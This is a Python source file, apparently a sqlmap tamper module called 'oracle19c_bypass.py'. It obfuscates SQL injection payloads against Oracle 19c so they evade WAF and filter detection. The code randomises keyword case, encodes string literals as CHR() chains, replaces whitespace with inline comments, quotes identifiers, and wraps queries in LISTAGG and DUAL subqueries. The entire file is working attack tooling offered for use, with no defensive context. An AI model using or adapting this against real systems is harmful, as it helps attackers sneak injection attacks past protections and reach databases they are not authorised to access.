#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : oracle19c_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import random
import re

def general_obfuscate(payload):
    if not payload:
        return payload

    keywords = ["SELECT", "FROM", "WHERE", "UNION", "ALL", "LISTAGG", "WITHIN", "GROUP", "DUAL"]
    for kw in keywords:
        payload = re.sub(r"\b%s\b" % kw, lambda m: "".join(c.upper() if random.random() > 0.5 else c.lower() for c in m.group(0)), payload, flags=re.IGNORECASE)

    payload = re.sub(r"'([a-zA-Z0-9_/]+)'", lambda m: "||".join("CHR(%d)" % ord(c) for c in m.group(1)), payload)

    payload = re.sub(r"\s+", lambda m: random.choice(["\n", "/**/", "/*%s*/" % random.randint(1000, 9999)]), payload)

    for iden in ["USER", "DUAL", "ALL_TABLES"]:
        payload = re.sub(r"\b%s\b" % iden, '"%s"' % iden, payload, flags=re.IGNORECASE)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "SELECT" in payload.upper() and "FROM DUAL" in payload.upper():
        match = re.search(r"SELECT\s+(.+?)\s+FROM\s+DUAL", payload, re.IGNORECASE)
        if match:
            inner = match.group(1)
            payload = payload.replace(match.group(0), "SELECT (SELECT LISTAGG(%s, ',') WITHIN GROUP (ORDER BY 1) FROM DUAL) FROM DUAL" % inner)

    if "FROM" in payload.upper() and "DUAL" not in payload.upper():
        payload = re.sub(r"FROM\s+(\w+)", r"FROM \1, (SELECT 1 FROM DUAL)", payload, flags=re.IGNORECASE)

    if "V$DATABASE" in payload.upper():
        payload = payload.replace("V$DATABASE", "(SELECT NAME FROM V$DATABASE WHERE NAME IS NOT NULL)")

    return general_obfuscate(payload)
